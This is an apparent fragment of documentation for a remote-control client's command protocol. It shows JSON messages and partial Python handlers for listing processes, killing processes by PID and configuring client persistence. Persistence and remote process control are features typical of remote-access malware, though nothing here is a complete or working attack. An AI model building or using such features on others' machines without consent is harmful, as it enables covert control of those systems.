...
### **ps / process - 获取系统进程列表** *(新增)*

**服务端发送**:
```json
{
  "type": "command",
  "payload": {"type": "ps", "payload": null}
}
```
...
```json
{
  ...
  "result": [
    ...
    {"pid": 5678, "name": "explorer.exe", "username": "user", "status": "sleeping"}
  ],
...
{
  "status": "error",
  "result": "No process with PID 1234",
  "result_type": "error"
}
```
或
...
{
  "status": "error",
  "result": "Access denied to kill process 1234",
  "result_type": "error"
}
```
...
{
  "status": "ok",
  "result": "Client persistence configured",
...
{
  "status": "error",
  "result": "Access denied to configure persistence",
  "result_type": "error"
}
```
...
{
  "status": "error",
  "result": "psutil module not available",
  "result_type": "error"
}
```
...
{
  "status": "error",
  "result": "PID must be a valid integer",
  "result_type": "error"
}
```
...
def handle_command(cmd, cmd_id):
    ...
    try:
        ...
        # 新增: 进程管理
            ...
            try:
                pid = int(type(payload) == dict and payload.get("pid") or payload)
                ...
                return {
                    ...
                    "result": {
                        "status": "ok",
                        "result": f"Process {pid} terminated successfully",
                        "result_type": "process_killed"
                    }
                }
                ...
                return {
                    ...
                    "result": {
                        "status": "error",
                        "result": f"No process with PID {pid}",
                        "result_type": "error"
                    }
                }
                ...
                return {
                    ...
                    "result": {
                        "status": "error",
                        "result": f"Access denied to kill process {pid}",
                        "result_type": "error"
                    }
                }
        ...
        # 持久化
            ...
            try:
                action = payload.get("action", "install") if isinstance(payload, dict) else "install"
                ...
                if action == "install":
                    ...
                    return {
                        ...
                        "result": {
                            "status": "ok",
                            "result": "Client persistence removed",
                            "result_type": "persistence"
                        }
                    }
                else:
                    return {
                        ...
                        "result": {
                            "status": "error",
                            "result": f"Unknown persist action: {action}",
                            "result_type": "error"
                        }
                    }
